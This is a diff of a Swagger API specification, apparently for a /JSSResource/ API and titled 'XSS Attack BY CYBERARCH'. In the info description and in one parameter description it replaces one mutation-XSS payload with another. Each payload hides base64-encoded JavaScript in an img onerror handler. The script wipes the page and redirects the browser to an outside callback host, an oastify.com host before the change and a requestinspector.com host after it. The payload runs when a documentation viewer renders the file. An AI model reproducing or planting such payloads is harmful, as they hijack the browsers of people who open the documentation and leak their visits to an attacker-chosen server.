@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY CYBERARCH
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzt3aW5kb3cubG9jYXRpb249J2h0dHA6Ly9kOG1yd3Vib2FsMXMxbXFpMzF1MGxpYWw0Y2EzeXZtay5vYXN0aWZ5LmNvbSc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzt3aW5kb3cubG9jYXRpb249J2h0dHBzOi8vMDFoeHJmZDNnOG4xNnR6emc4djVoZHFlOTcwMC03YThjY2JjNDkxMzFjZWNjMmVkMS5yZXF1ZXN0aW5zcGVjdG9yLmNvbSc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzt3aW5kb3cubG9jYXRpb249J2h0dHA6Ly9kOG1yd3Vib2FsMXMxbXFpMzF1MGxpYWw0Y2EzeXZtay5vYXN0aWZ5LmNvbSc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzt3aW5kb3cubG9jYXRpb249J2h0dHBzOi8vMDFoeHJmZDNnOG4xNnR6emc4djVoZHFlOTcwMC03YThjY2JjNDkxMzFjZWNjMmVkMS5yZXF1ZXN0aW5zcGVjdG9yLmNvbSc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'>"></form>
 
           format: int64
           in: path
